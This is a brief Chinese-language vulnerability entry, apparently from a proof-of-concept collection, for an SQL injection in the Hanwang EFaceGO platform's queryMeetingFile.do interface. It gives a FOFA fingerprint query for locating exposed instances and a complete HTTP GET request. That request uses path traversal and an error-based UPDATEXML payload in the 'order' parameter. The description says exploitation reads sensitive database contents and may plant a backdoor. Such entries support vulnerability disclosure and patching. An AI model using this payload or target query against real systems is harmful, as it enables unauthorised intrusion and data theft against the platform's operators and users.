## 汉王EFaceGO queryMeetingFile.do SQL注入漏洞

## 漏洞描述
汉王 EFaceGO 平台 `queryMeetingFile.do` 接口对参数未进行过滤，攻击者可以执行 SQL 注入读取数据库敏感信息并可能写入后门。

## 网络空间测绘
```
fofa: icon_hash="1380907357"
```

## POC
```
GET /manage/intercom/../../../../manage/meeting/queryMeetingFile.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

## 参考
- 社区情报

